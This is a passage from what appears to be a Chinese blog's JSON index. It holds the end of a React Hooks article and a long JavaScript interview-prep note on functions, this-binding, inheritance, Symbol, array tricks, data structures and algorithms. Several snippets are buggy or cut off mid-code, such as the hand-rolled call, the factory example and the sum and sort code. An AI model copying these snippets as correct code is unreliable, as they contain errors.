};}; 在线 Demo 然后通过 render-props 这个库可以轻松封装出 RenderProps 组件： 12const Toggle = ({ initialValue, children, render = children }) => renderProps(render, useToggle(initialValue)); 在线 Demo 其实 renderProps 这个组件的第二个参数，在 Class 形式 React 组件时，接收的是 this.state，现在我们改成 useToggle 返回的对象，也可以理解为 state，利用 Hooks 机制驱动 Toggle 组件 rerender，从而让子组件 rerender。 封装原本对 setState 增强的库Hooks 也特别适合封装原本就作用于 setState 的库，比如 immer。 useState 虽然不是 setState，但却可以理解为控制高阶组件的 setState，我们完全可以封装一个自定义的 useState，然后内置对 setState 的优化。 比如 immer 的语法是通过 produce 包装，将 mutable 代码通过 Proxy 代理为 immutable： 1234const nextState = produce(baseState, draftState => { draftState.push({ todo: \"Tweet about it\" }); draftState[1].done = true;}); 那这个 produce 就可以通过封装一个 useImmer 来隐藏掉： 123456789function useImmer(initialValue) { const [val, updateValue] = React.useState(initialValue); return [ val, updater => { updateValue(produce(updater)); } ];} 使用方式： 123const [value, setValue] = useImmer({ a: 1 });value(obj => (obj.a = 2)); // immutable 总结把 React Hooks 当作更便捷的 RenderProps 去用吧，虽然写法看上去是内部维护了一个状态，但其实等价于注入、Connect、HOC、或者 renderProps，那么如此一来，使用 renderProps 的门槛会大大降低，因为 Hooks 用起来实在是太方便了，我们可以抽象大量 Custom Hooks，让代码更加 FP，同时也不会增加嵌套层级。 那么看了这么多使用实例，你准备怎么用呢？ 原文：https://github.com/ascoders/blog/issues/29","link":"/posts/61d76a16/"},{"title":"JS 原生面经从初级到高级","text":"原文 https://juejin.im/post/5daeefc8e51d4524f007fb15 本文只做记录 1.函数1.1函数的3种定义方法1.1.1 函数声明12345//ES5function getSum(){}function (){}//匿名函数//ES6()=>{}//如果{}内容只有一行{}和return关键字可省, 1.1.2 函数表达式(函数字面量)1234//ES5var sum=function(){}//ES6let sum=()=>{}//如果{}内容只有一行{}和return关键字可省, 1.1.3 构造函数1const sum = new Function('a', 'b' , 'return a + b') 1.1.4 三种方法的对比1.函数声明有预解析,而且函数声明的优先级高于变量;2.使用Function构造函数定义函数的方式是一个函数表达式,这种方式会导致解析两次代码，影响性能。第一次解析常规的JavaScript代码，第二次解析传入构造函数的字符串 1.2.ES5中函数的4种调用在ES5中函数内容的this指向和调用方法有关 1.2.1 函数调用模式包括函数名()和匿名函数调用,this指向window 12345678910111213function getSum() { console.log(this) //window } getSum() (function() { console.log(this) //window })() var getSum=function() { console.log(this) //window } getSum() 1.2.2 方法调用对象.方法名(),this指向对象 1234567var objList = { name: 'methods', getSum: function() { console.log(this) //objList对象 }}objList.getSum() 1.2.3 构造器调用new 构造函数名(),this指向构造函数 1234function Person() { console.log(this); //指向构造函数Person}var personOne = new Person(); 1.2.4 间接调用利用call和apply来实现,this就是call和apply对应的第一个参数,如果不传值或者第一个值为null,undefined时this指向window 12345function foo() { console.log(this);}foo.apply('我是apply改变的this值');//我是apply改变的this值foo.call('我是call改变的this值');//我是call改变的this值 1.3 ES6中函数的调用箭头函数不可以当作构造函数使用，也就是不能用new命令实例化一个对象，否则会抛出一个错误箭头函数的this是和定义时有关和调用无关调用就是函数调用模式 123456789101112131415(() => { console.log(this)//window})()let arrowFun = () => { console.log(this)//window}arrowFun()let arrowObj = { arrFun: function() { (() => { console.log(this)//arrowObj })() } } arrowObj.arrFun(); 1.4.call,apply和bind1.IE5之前不支持call和apply,bind是ES5出来的;2.call和apply可以调用函数,改变this,实现继承和借用别的对象的方法; 1.4.1 call和apply定义调用方法,用一个对象替换掉另一个对象(this)对象.call(新this对象,实参1,实参2,实参3…..)对象.apply(新this对象,[实参1,实参2,实参3…..]) 1.4.2 call和apply用法1.间接调用函数,改变作用域的this值2.劫持其他对象的方法 1234567891011var foo = { name:\"张三\", logName:function(){ console.log(this.name); }}var bar={ name:\"李四\"};foo.logName.call(bar);//李四实质是call改变了foo的this指向为bar,并调用该函数 3.两个函数实现继承 1234567891011function Animal(name){ this.name = name; this.showName = function(){ console.log(this.name); } } function Cat(name){ Animal.call(this, name); } var cat = new Cat(\"Black Cat\"); cat.showName(); //Black Cat 4.为类数组(arguments和nodeList)添加数组方法push,pop 1234(function(){ Array.prototype.push.call(arguments,'王五'); console.log(arguments);//['张三','李四','王五']})('张三','李四') 5.合并数组 123let arr1=[1,2,3]; let arr2=[4,5,6]; Array.prototype.push.apply(arr1,arr2); //将arr2合并到了arr1中 6.求数组最大值 1Math.max.apply(null,arr) 7.判断字符类型 1Object.prototype.toString.call({}) 1.4.3 bindbind是function的一个函数扩展方法，bind以后代码重新绑定了func内部的this指向,不会调用方法,不兼容IE8 1234567891011var name = '李四' var foo = { name: \"张三\", logName: function(age) { console.log(this.name, age); } } var fooNew = foo.logName; var fooNewBind = foo.logName.bind(foo); fooNew(10)//李四,10 fooNewBind(11)//张三,11 因为bind改变了fooNewBind里面的this指向 1.4.4 call,apply和bind原生实现call实现: 12345678910111213Function.prototype.newCall = function(context, ...parameter) {if(context.instanceof!==Object) context={} context.fn = this; context.fn(...parameter); delete context.fn;}let person = { name: 'Abiel'}function sayHi(age,sex) { console.log(this.name, age, sex);}sayHi.newCall (person, 25, '男'); // Abiel 25 男 apply实现: 1234567891011Function.prototype.newApply = function(context, parameter) { if (typeof context === 'object') { context = context || window } else { context = Object.create(null) } let fn = Symbol() context[fn] = this context[fn](parameter); delete context[fn]} bind实现: 1234567891011121314Function.prototype.bind = function (context,...innerArgs) { var me = this return function (...finnalyArgs) { return me.call(context,...innerArgs,...finnalyArgs) }}let person = { name: 'Abiel'}function sayHi(age,sex) { console.log(this.name, age, sex);}let personSayHi = sayHi.bind(person, 25)personSayHi('男') 1.4.5 三者异同同:都是改变this指向,都可接收参数异:bind和call是接收单个参数,apply是接收数组 1.5.函数的节流和防抖 类型 概念 应用 节流 某个时间段内,只执行一次 滚动条,resize事件一段时间触发一次 防抖 处理函数截止后一段时间依次执行 onscroll,resize事件触发完后一段时间触发 节流: 1.5.1 节流123456789101112131415let throttle = function(func, delay) { let timer = null; return function() { if (!timer) { timer = setTimeout(function() { func.apply(this, arguments); timer = null; }, delay); } }; }; function handle() { console.log(Math.random()); } window.addEventListener(\"onscroll\", throttle(handle, 1000)); //事件处理函数 1.5.2 防抖12345678910111213141516function debounce(fn, wait) { var timeout = null; return function() { if (timeout !== null) clearTimeout(timeout);//如果多次触发将上次记录延迟清除掉 timeout = setTimeout(function() { fn.apply(this, arguments); timeout = null; }, wait); }; } // 处理函数 function handle() { console.log(Math.random()); } // 滚动事件 window.addEventListener(\"onscroll\", debounce(handle, 1000)); 1.6.原型链1.6.1 定义对象继承属性的一个链条 1.6.2构造函数,实例与原型对象的关系 12var Person = function (name) { this.name = name; }//person是构造函数var o3personTwo = new Person('personTwo')//personTwo是实例 原型对象都有一个默认的constructor属性指向构造函数 1.6.3 创建实例的方法1.字面量 1let obj={'name':'张三'} 2.Object构造函数创建 12let Obj=new Object()Obj.name='张三' 3.使用工厂模式创建对象 1234567function createPerson(name){ var o = new Object(); o.name = name; }; return o; }var person1 = createPerson('张三'); 4.使用构造函数创建对象 1234function Person(name){ this.name = name;}var person1 = new Person('张三'); 1.6.4 new运算符1.创了一个新对象;2.this指向构造函数;3.构造函数有返回,会替换new出来的对象,如果没有就是new出来的对象4.手动封装一个new运算符 123456789var new2 = function (func) { var o = Object.create(func.prototype);//创建对象 var k = func.call(o);//改变this指向，把结果付给k if (typeof k === 'object') {//判断k的类型是不是对象 return k;&emsp;//是，返回k } else { return o;//不是返回返回构造函数的执行结果 }} 1.6.5 对象的原型链 1.7 继承的方式JS是一门弱类型动态语言,封装和继承是他的两大特性 1.7.1 原型链继承将父类的实例作为子类的原型1.代码实现定义父类: 12345678910111213// 定义一个动物类function Animal (name) { // 属性 this.name = name || 'Animal'; // 实例方法 this.sleep = function(){ console.log(this.name + '正在睡觉！'); }}// 原型方法Animal.prototype.eat = function(food) { console.log(this.name + '正在吃：' + food);}; 子类: 1234567891011function Cat(){ }Cat.prototype = new Animal();Cat.prototype.name = 'cat';//&emsp;Test Codevar cat = new Cat();console.log(cat.name);//catconsole.log(cat.eat('fish'));//cat正在吃：fish undefinedconsole.log(cat.sleep());//cat正在睡觉！ undefinedconsole.log(cat instanceof Animal); //true console.log(cat instanceof Cat); //true 2.优缺点简单易于实现,但是要想为子类新增属性和方法，必须要在new Animal()这样的语句之后执行,无法实现多继承 1.7.2 构造继承实质是利用call来改变Cat中的this指向1.代码实现子类: 1234function Cat(name){ Animal.call(this); this.name = name || 'Tom';} 2.优缺点可以实现多继承,不能继承原型属性/方法 1.7.3 实例继承为父类实例添加新特性，作为子类实例返回1.代码实现子类 12345function Cat(name){ var instance = new Animal(); instance.name = name || 'Tom'; return instance;} 2.优缺点不限制调用方式,但不能实现多继承 1.7.4 拷贝继承将父类的属性和方法拷贝一份到子类中1.子类: 1234567function Cat(name){ var animal = new Animal(); for(var p in animal){ Cat.prototype[p] = animal[p]; } Cat.prototype.name = name || 'Tom';} 2.优缺点支持多继承,但是效率低占用内存 1.7.5 组合继承通过调用父类构造，继承父类的属性并保留传参的优点，然后通过将父类实例作为子类原型，实现函数复用1.子类: 123456function Cat(name){ Animal.call(this); this.name = name || 'Tom';}Cat.prototype = new Animal();Cat.prototype.constructor = Cat; 1.7.6 寄生组合继承1234567891011function Cat(name){ Animal.call(this); this.name = name || 'Tom';}(function(){ // 创建一个没有实例方法的类 var Super = function(){}; Super.prototype = Animal.prototype; //将实例作为子类的原型 Cat.prototype = new Super();})(); 1.7.7 ES6的extends继承ES6 的继承机制是先创造父类的实例对象this（所以必须先调用super方法），然后再用子类的构造函数修改this 12345678910111213141516171819202122232425262728//父类class Person { //constructor是构造方法 constructor(skin, language) { this.skin = skin; this.language = language; } say() { console.log('我是父类') }}//子类class Chinese extends Person { constructor(skin, language, positon) { //console.log(this);//报错 super(skin, language); //super();相当于父类的构造函数 //console.log(this);调用super后得到了this，不报错，this指向子类，相当于调用了父类.prototype.constructor.call(this) this.positon = positon; } aboutMe() { console.log(`${this.skin} ${this.language} ${this.positon}`); }}//调用只能通过new的方法得到实例,再调用里面的方法let obj = new Chinese('红色', '中文', '香港');obj.aboutMe();obj.say(); 1.8.高阶函数1.8.1定义函数的参数是函数或返回函数 1.8.2 常见的高阶函数map,reduce,filter,sort 1.8.3 柯里化1.定义:只传递给函数一部分参数来调用它，让它返回一个函数去处理剩下的参数 1fn(a,b,c,d)=>fn(a)(b)(c)(d) 2.代码实现: 123456789const currying = fn => {const len = fn.lengthreturn function curr (...args1) { if (args1.length >= len) { return fn(...args1) } return (...args2) => curr(...args1, ...args2) }} 1.8.4 反柯里化1.定义: 1obj.func(arg1, arg2)=>func(obj, arg1, arg2) 2.代码实现: 123456789101112Function.prototype.uncurrying = function() { var that = this; return function() { return Function.prototype.call.apply(that, arguments); }}; function sayHi () { return \"Hello \" + this.value +\" \"+[].slice.call(arguments);}let sayHiuncurrying=sayHi.uncurrying();console.log(sayHiuncurrying({value:'world'},\"hahaha\")); 1.8.5偏函数1.定义:指定部分参数来返回一个新的定制函数的形式2.例子: 123456function foo(a, b, c) { return a + b + c;}function func(a, b) { return foo(a,b,8);} 2.对象2.1.对象的声明方法2.1.1 字面量12345var test2 = {x:123,y:345};console.log(test2);//{x:123,y:345};console.log(test2.x);//123console.log(test2.__proto__.x);//undefinedconsole.log(test2.__proto__.x === test2.x);//false 2.1.2 构造函数12345var test1 = new Object({x:123,y:345});console.log(test1);//{x:123,y:345}console.log(test1.x);//123console.log(test1.__proto__.x);//undefinedconsole.log(test1.__proto__.x === test1.x);//false new的作用:1.创了一个新对象;2.this指向构造函数;3.构造函数有返回,会替换new出来的对象,如果没有就是new出来的对象 2.1.3 内置方法Obejct.create(obj,descriptor),obj是对象,describe描述符属性(可选) 12345let test = Object.create({x:123,y:345});console.log(test);//{}console.log(test.x);//123console.log(test.__proto__.x);//3console.log(test.__proto__.x === test.x);//true 2.1.4 三种方法的优缺点1.功能:都能实现对象的声明,并能够赋值和取值2.继承性:内置方法创建的对象继承到__proto__属性上3.隐藏属性:三种声明方法会默认为内部的每个成员（属性或方法）生成一些隐藏属性，这些隐藏属性是可以读取和可配置的,属性分类见下面4.属性读取:Object.getOwnPropertyDescriptor()或getOwnPropertyDescriptor()5.属性设置:Object.definePropertype或Object.defineProperties 2.2.对象的属性2.2.1 属性分类1.数据属性4个特性:configurable(可配置),enumerable(可枚举),writable(可修改),value(属性值)2.访问器属性2个特性:get(获取),set(设置)3.内部属性由JavaScript引擎内部使用的属性;不能直接访问,但是可以通过对象内置方法间接访问,如:[[Prototype]]可以通过 Object.getPrototypeOf()访问;内部属性用[[]]包围表示,是一个抽象操作,没有对应字符串类型的属性名,如[[Prototype]]. 2.2.2 属性描述符1.定义:将一个属性的所有特性编码成一个对象返回2.描述符的属性有:数据属性和访问器属性3.使用范围:作为方法Object.defineProperty, Object.getOwnPropertyDescriptor, Object.create的第二个参数, 2.2.3 属性描述符的默认值1.访问对象存在的属性 特性名 默认值 value 对应属性值 get 对应属性值 set undefined writable true enumerable true configurable true 所以通过上面三种声明方法已存在的属性都是有这些默认描述符2.访问对象不存在的属性 特性名 默认值 value undefined get undefined set undefined writable false enumerable false configurable false 2.2.3 描述符属性的使用规则get,set与wriable,value是互斥的,如果有交集设置会报错 2.2.4 属性定义1.定义属性的函数有两个:Object.defineProperty和Object.defineProperties.例如:Object.defineProperty(obj, propName, desc)2.在引擎内部,会转换成这样的方法调用:obj.[[DefineOwnProperty]](propName, desc, true) 2.2.5 属性赋值1.赋值运算符(=)就是在调用[[Put]].比如:obj.prop = v;2.在引擎内部,会转换成这样的方法调用:obj.[[Put]](“prop”, v, isStrictModeOn) 2.2.6 判断对象的属性 名称 含义 用法 in 如果指定的属性在指定的对象或其原型链中，则in 运算符返回true ‘name’ in test //true hasOwnProperty() 只判断自身属性 test.hasOwnProperty(‘name’) //true .或[] 对象或原型链上不存在该属性，则会返回undefined test.name //“lei” test[“name”] //“lei” 2.3.Symbol2.3.1概念是一种数据类型;不能new,因为Symbol是一个原始类型的值，不是对象。 2.3.2 定义方法Symbol(),可以传参var s1 = Symbol();var s2 = Symbol();s1 === s2 // false 1234// 有参数的情况var s1 = Symbol(\"foo\");var s2 = Symbol(\"foo\");s1 === s2 // false 2.3.3 用法1.不能与其他类型的值进行运算;2.作为属性名 12345678910111213let mySymbol = Symbol();// 第一种写法var a = {};a[mySymbol] = 'Hello!';// 第二种写法var a = { [mySymbol]: 'Hello!'};// 第三种写法var a = {};Object.defineProperty(a, mySymbol, { value: 'Hello!' });// 以上写法都得到同样结果a[mySymbol] // \"Hello!\" 3.作为对象属性名时，不能用点运算符,可以用[] 12345let a = {};let name = Symbol();a.name = 'lili';a[name] = 'lucy';console.log(a.name,a[name]); 4.遍历不会被for…in、for…of和Object.keys()、Object.getOwnPropertyNames()取到该属性 2.3.4 Symbol.for1.定义:在全局中搜索有没有以该参数作为名称的Symbol值，如果有，就返回这个Symbol值，否则就新建并返回一个以该字符串为名称的Symbol值2.举例: 123var s1 = Symbol.for('foo');var s2 = Symbol.for('foo');s1 === s2 // true 2.3.5 Symbol.keyFor1.定义:返回一个已登记的Symbol类型值的key2.举例: 1234var s1 = Symbol.for(\"foo\");Symbol.keyFor(s1) // \"foo\"var s2 = Symbol(\"foo\");Symbol.keyFor(s2) // undefined 2.4.遍历2.4.1 一级对象遍历方法 方法 特性 for … in 遍历对象自身的和继承的可枚举属性(不含Symbol属性) Object.keys(obj) 返回一个数组,包括对象自身的(不含继承的)所有可枚举属性(不含Symbol属性) Object.getOwnPropertyNames(obj) 返回一个数组,包括对象自身的所有可枚举属性(不含Symbol属性) Object.getOwnPropertySymbols(obj) 返回一个数组,包含对象自身的所有Symbol属性 Reflect.ownKeys(obj) 返回一个数组,包含对象自身的所有(不枚举、可枚举和Symbol)属性 Reflect.enumerate(obj) 返回一个Iterator对象,遍历对象自身的和继承的所有可枚举属性(不含Symbol属性) 总结:1.只有Object.getOwnPropertySymbols(obj)和Reflect.ownKeys(obj)可以拿到Symbol属性2.只有Reflect.ownKeys(obj)可以拿到不可枚举属性 2.4.2 多级对象遍历数据模型: 1234567891011121314151617181920212223242526272829var treeNodes = [ { id: 1, name: '1', children: [ { id: 11, name: '11', children: [ { id: 111, name: '111', children:[] }, { id: 112, name: '112' } ] }, { id: 12, name: '12', children: [] } ], users: [] }, ]; 递归: 123456789101112var parseTreeJson = function(treeNodes){ if (!treeNodes || !treeNodes.length) return; for (var i = 0, len = treeNodes.length; i < len; i++) { var childs = treeNodes[i].children; console.log(treeNodes[i].id); if(childs && childs.length > 0){ parseTreeJson(childs); } } }; console.log('------------- 递归实现 ------------------'); parseTreeJson(treeNodes); 2.5.深度拷贝2.5.1 Object.assign1.定义:将源对象（source）的所有可枚举属性，复制到目标对象（target）2.用法: 12345合并多个对象var target = { a: 1, b: 1 };var source1 = { b: 2, c: 2 };var source2 = { c: 3 };Object.assign(target, source1, source2); 3.注意:这个是伪深度拷贝,只能拷贝第一层 2.5.2 JSON.stringify1.原理:是将对象转化为字符串,而字符串是简单数据类型 2.5.3 递归拷贝1234567891011121314function deepClone(source){ const targetObj = source.constructor === Array ? [] : {}; // 判断复制的目标是数组还是对象 for(let keys in source){ // 遍历目标 if(source.hasOwnProperty(keys)){ if(source[keys] && typeof source[keys] === 'object'){ // 如果值是对象，就递归一下 targetObj[keys] = source[keys].constructor === Array ? [] : {}; targetObj[keys] = deepClone(source[keys]); }else{ // 如果不是，就直接赋值 targetObj[keys] = source[keys]; } } } return targetObj;} 2.6.数据拦截定义:利用对象内置方法,设置属性,进而改变对象的属性值 2.6.1 Object.defineProterty1.ES5出来的方法;2.三个参数:对象(必填),属性值(必填),描述符(可选);3.defineProterty的描述符属性 123数据属性:value,writable,configurable,enumerable访问器属性:get,set注:不能同时设置value和writable,这两对属性是互斥的 4.拦截对象的两种情况: 12345678910111213141516171819202122232425262728293031let obj = {name:'',age:'',sex:'' }, defaultName = [\"这是姓名默认值1\",\"这是年龄默认值1\",\"这是性别默认值1\"]; Object.keys(obj).forEach(key => { Object.defineProperty(obj, key, { get() { return defaultName; }, set(value) { defaultName = value; } }); }); console.log(obj.name); console.log(obj.age); console.log(obj.sex); obj.name = \"这是改变值1\"; console.log(obj.name); console.log(obj.age); console.log(obj.sex); let objOne={},defaultNameOne=\"这是默认值2\"; Object.defineProperty(obj, 'name', { get() { return defaultNameOne; }, set(value) { defaultNameOne = value; } }); console.log(objOne.name); objOne.name = \"这是改变值2\"; console.log(objOne.name); 5.拦截数组变化的情况 1234567891011121314151617181920let a={};bValue=1;Object.defineProperty(a,\"b\",{ set:function(value){ bValue=value; console.log(\"setted\"); }, get:function(){ return bValue; }});a.b;//1a.b=[];//setteda.b=[1,2,3];//setteda.b[1]=10;//无输出a.b.push(4);//无输出a.b.length=5;//无输出a.b;//[1,10,3,4,undefined];结论:defineProperty无法检测数组索引赋值,改变数组长度的变化; 但是通过数组方法来操作可以检测到 6.存在的问题 12不能监听数组索引赋值和改变长度的变化必须深层遍历嵌套的对象,因为defineProterty只能劫持对象的属性,因此我们需要对每个对象的每个属性进行遍历，如果属性值也是对象那么需要深度遍历,显然能劫持一个完整的对象是更好的选择 2.6.2 proxy1.ES6出来的方法,实质是对对象做了一个拦截,并提供了13个处理方法2.两个参数:对象和行为函数 12345678910111213let handler = { get(target, key, receiver) { console.log(\"get\", key); return Reflect.get(target, key, receiver); }, set(target, key, value, receiver) { console.log(\"set\", key, value); return Reflect.set(target, key, value, receiver); } }; let proxy = new Proxy(obj, handler); proxy.name = \"李四\"; proxy.age = 24; 3.问题和优点reflect对象没有构造函数可以监听数组索引赋值,改变数组长度的变化,是直接监听对象的变化,不用深层遍历 2.6.3 defineProterty和proxy的对比1.defineProterty是es5的标准,proxy是es6的标准;2.proxy可以监听到数组索引赋值,改变数组长度的变化;3.proxy是监听对象,不用深层遍历,defineProterty是监听属性;3.利用defineProterty实现双向数据绑定(vue2.x采用的核心)4.利用proxy实现双向数据绑定(vue3.x会采用) 3.数组数组基本上考察数组方法多一点,所以这里就单纯介绍常见的场景数组的方法,还有很多场景后续补充;本文主要从应用来讲数组api的一些骚操作;如一行代码扁平化n维数组、数组去重、求数组最大值、数组求和、排序、对象和数组的转化等；上面这些应用场景你可以用一行代码实现？ 3.1 扁平化n维数组1.终极篇 1234[1,[2,3]].flat(2) //[1,2,3][1,[2,3,[4,5]].flat(3) //[1,2,3,4,5][1,[2,3,[4,5]]].toString() //'1,2,3,4,5'[1[2,3,[4,5[...]].flat(Infinity) //[1,2,3,4...n] Array.flat(n)是ES10扁平数组的api,n表示维度,n值为Infinity时维度为无限大2.开始篇 12345678function flatten(arr) { while(arr.some(item=>Array.isArray(item))) { arr = [].concat(...arr); } return arr;}flatten([1,[2,3]]) //[1,2,3]flatten([1,[2,3,[4,5]]) //[1,2,3,4,5] 实质是利用递归和数组合并方法concat实现扁平 3.2 去重1.终极篇 12Array.from(new Set([1,2,3,3,4,4])) //[1,2,3,4][...new Set([1,2,3,3,4,4])] //[1,2,3,4] set是ES6新出来的一种一种定义不重复数组的数据类型Array.from是将类数组转化为数组…是扩展运算符,将set里面的值转化为字符串2.开始篇 123456789101112Array.prototype.distinct = nums => {const map = {}const result = []for (const n of nums) { if (!(n in map)) { map[n] = 1 result.push(n) }}return result}[1,2,3,3,4,4].distinct(); //[1,2,3,4] 取新数组存值,循环两个数组值相比较 3.3排序1.终极篇 12[1,2,3,4].sort((a, b) => a - b); // [1, 2,3,4],默认是升序[1,2,3,4].sort((a, b) => b - a); // [4,3,2,1] 降序 sort是js内置的排序方法,参数为一个函数2.开始篇冒泡排序: 123456789101112131415Array.prototype.bubleSort=function () { let arr=this, len = arr.length; for (let outer = len; outer >= 2; outer--) { for (let inner = 0; inner arr[inner + 1]) { //升序 [arr[inner], arr[inner + 1]] = [arr[inner + 1], arr[inner]]; console.log([arr[inner], arr[inner + 1]]); } } } return arr; }[1,2,3,4].bubleSort() //[1,2,3,4] 选择排序 12345678910111213Array.prototype.selectSort=function () { let arr=this, len = arr.length; for (let i = 0, len = arr.length; i < len; i++) { for (let j = i, len = arr.length; j < len; j++) { if (arr[i] > arr[j]) { [arr[i], arr[j]] = [arr[j], arr[i]]; } } } return arr; } [1,2,3,4].selectSort() //[1,2,3,4] 3.4最大值1.终极篇 12345Math.max(...[1,2,3,4]) //4Math.max.apply(this,[1,2,3,4]) //4[1,2,3,4].reduce( (prev, cur,curIndex,arr)=> { return Math.max(prev,cur);},0) //4 Math.max()是Math对象内置的方法,参数是字符串;reduce是ES5的数组api,参数有函数和默认初始值;函数有四个参数,pre(上一次的返回值),cur(当前值),curIndex(当前值索引),arr(当前数组)2.开始篇先排序再取值 3.5求和1.终极篇 123[1,2,3,4].arr.reduce(function (prev, cur) { return prev + cur; },0) //10 2.开始篇 1234567891011function sum(arr) { var len = arr.length; if(len == 0){ return 0; } else if (len == 1){ return arr[0]; } else { return arr[0] + sum(arr.slice(1)); }}sum([1,2,3,4]) //10 利用slice截取改变数组,再利用递归求和 3.6合并1.终极篇 1234[1,2,3,4].concat([5,6]) //[1,2,3,4,5,6][...[1,2,3,4],...[4,5]] //[1,2,3,4,5,6]let arrA = [1, 2], arrB = [3, 4]Array.prototype.push.apply(arrA, arrB))//arrA值为[1,2,3,4] 2.开始篇 12345let arr=[1,2,3,4]; [5,6].map(item=>{ arr.push(item) }) //arr值为[1,2,3,4,5,6],注意不能直接return出来,return后只会返回[5,6] 3.7判断是否包含值1.终极篇 1234[1,2,3].includes(4) //false[1,2,3].indexOf(4) //-1 如果存在换回索引[1, 2, 3].find((item)=>item===3)) //3 如果数组中无值返回undefined[1, 2, 3].findIndex((item)=>item===3)) //2 如果数组中无值返回-1 includes(),find(),findIndex()是ES6的api2.开始篇 123[1,2,3].some(item=>{ return item===3}) //true 如果不包含返回false 3.8类数组转化1.终极篇 1234Array.prototype.slice.call(arguments) //arguments是类数组(伪数组)Array.prototype.slice.apply(arguments)Array.from(arguments)[...arguments] 类数组:表示有length属性,但是不具备数组的方法call,apply:是改变slice里面的this指向arguments,所以arguments也可调用数组的方法Array.from是将类似数组或可迭代对象创建为数组…是将类数组扩展为字符串,再定义为数组2.开始篇 123456789Array.prototype.slice = function(start,end){ var result = new Array(); start = start || 0; end = end || this.length; //this指向调用的对象，当用了call后，能够改变this的指向，也就是指向传进来的对象，这是关键 for(var i = start; i < end; i++){ result.push(this[i]); } return result; } 3.9每一项设置值1.终极篇 1[1,2,3].fill(false) //[false,false,false] fill是ES6的方法2.开始篇 1[1,2,3].map(() => 0) 3.10每一项是否满足1[1,2,3].every(item=>{return item>2}) //false every是ES5的api,每一项满足返回 true 3.11有一项满足1[1,2,3].some(item=>{return item>2}) //true some是ES5的api,有一项满足返回 true 3.12.过滤数组1[1,2,3].filter(item=>{return item>2}) //[3] filter是ES5的api,返回满足添加的项的数组 3.13对象和数组转化1234Object.keys({name:'张三',age:14}) //['name','age']Object.values({name:'张三',age:14}) //['张三',14]Object.entries({name:'张三',age:14}) //[[name,'张三'],[age,14]]Object.fromEntries([name,'张三'],[age,14]) //ES10的api,Chrome不支持 , firebox输出{name:'张三',age:14} 3.14 对象数组1[{count:1},{count:2},{count:3}].reduce((p, e)=>p+(e.count), 0) 4.数据结构篇 数据结构是计算机存储、组织数据的方式,算法是系统描述解决问题的策略。了解基本的数据结构和算法可以提高代码的性能和质量。也是程序猿进阶的一个重要技能。手撸代码实现栈,队列,链表,字典,二叉树,动态规划和贪心算法 4.1 栈栈的特点：先进后出 12345678910111213141516171819202122232425262728293031323334353637383940class Stack { constructor() { this.items = []; } // 入栈 push(element) { this.items.push(element); } // 出栈 pop() { return this.items.pop(); } // 末位 get peek() { return this.items[this.items.length - 1]; } // 是否为空栈 get isEmpty() { return !this.items.length; } // 长度 get size() { return this.items.length; } // 清空栈 clear() { this.items = []; } } // 实例化一个栈 const stack = new Stack(); console.log(stack.isEmpty); // true // 添加元素 stack.push(5); stack.push(8); // 读取属性再添加 console.log(stack.peek); // 8 stack.push(11); console.log(stack.size); // 3 console.log(stack.isEmpty); // false 4.2 队列队列：先进先出class Queue {constructor(items) {this.items = items || [];} 12345678910111213141516171819202122232425262728293031enqueue(element) { this.items.push(element); } dequeue() { return this.items.shift(); } front() { return this.items[0]; } clear() { this.items = []; } get size() { return this.items.length; } get isEmpty() { return !this.items.length; } print() { console.log(this.items.toString()); } } const queue = new Queue(); console.log(queue.isEmpty); // true queue.enqueue(\"John\"); queue.enqueue(\"Jack\"); queue.enqueue(\"Camila\"); console.log(queue.size); // 3 console.log(queue.isEmpty); // false queue.dequeue(); queue.dequeue(); 4.3 链表链表:存贮有序元素的集合;但是不同于数组,每个元素是一个存贮元素本身的节点和指向下一个元素引用组成要想访问链表中间的元素,需要从起点开始遍历找到所需元素 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114class Node { constructor(element) { this.element = element; this.next = null; } } // 链表 class LinkedList { constructor() { this.head = null; this.length = 0; } // 追加元素 append(element) { const node = new Node(element); let current = null; if (this.head === null) { this.head = node; } else { current = this.head; while (current.next) { current = current.next; } current.next = node; } this.length++; } // 任意位置插入元素 insert(position, element) { if (position >= 0 && position { return node ? (node.left ? minNode(node.left) : node) : null; }; return minNode(node || this.root); } max(node) { const maxNode = node => { return node ? (node.right ? maxNode(node.right) : node) : null; }; return maxNode(node || this.root); } } const tree = new BinarySearchTree(); tree.insert(11); tree.insert(7); tree.insert(5); tree.insert(3); tree.insert(9); tree.insert(8); tree.insert(10); tree.insert(13); tree.insert(12); tree.insert(14); tree.inOrderTraverse(value => { console.log(value); }); console.log(tree.min()); console.log(tree.max()); 5.算法篇5.1 冒泡算法冒泡排序，选择排序，插入排序，此处不做赘述. 5.2 斐波那契特点：第三项等于前面两项之和 123456function fibonacci(num) { if (num === 1 || num === 2) { return 1 } return fibonacci(num - 1) + fibonacci(num - 2) } 5.3 动态规划特点：通过全局规划,将大问题分割成小问题来取最优解案例：最少硬币找零美国有以下面额(硬币）：d1=1, d2=5, d3=10, d4=25如果要找36美分的零钱，我们可以用1个25美分、1个10美分和1个便士（ 1美分) 1234567891011121314151617181920212223242526272829class MinCoinChange {constructor(coins) { this.coins = coins this.cache = {}}makeChange(amount) { if (!amount) return [] if (this.cache[amount]) return this.cache[amount] let min = [], newMin, newAmount this.coins.forEach(coin => { newAmount = amount - coin if (newAmount >= 0) { newMin = this.makeChange(newAmount) } if (newAmount >= 0 && (newMin.length < min.length - 1 || !min.length) && (newMin.length || !newAmount)) { min = [coin].concat(newMin) } }) return (this.cache[amount] = min)}}const rninCoinChange = new MinCoinChange([1, 5, 10, 25])console.log(rninCoinChange.makeChange(36))// [1, 10, 25]const minCoinChange2 = new MinCoinChange([1, 3, 4])console.log(minCoinChange2.makeChange(6))// [3, 3] 5.4 贪心算法特点：通过最优解来解决问题用贪心算法来解决2.3中的案例 123456789101112131415161718class MinCoinChange2 {constructor(coins) { this.coins = coins}makeChange(amount) { const change = [] let total = 0 this.coins.sort((a, b) => a < b).forEach(coin => { if ((total + 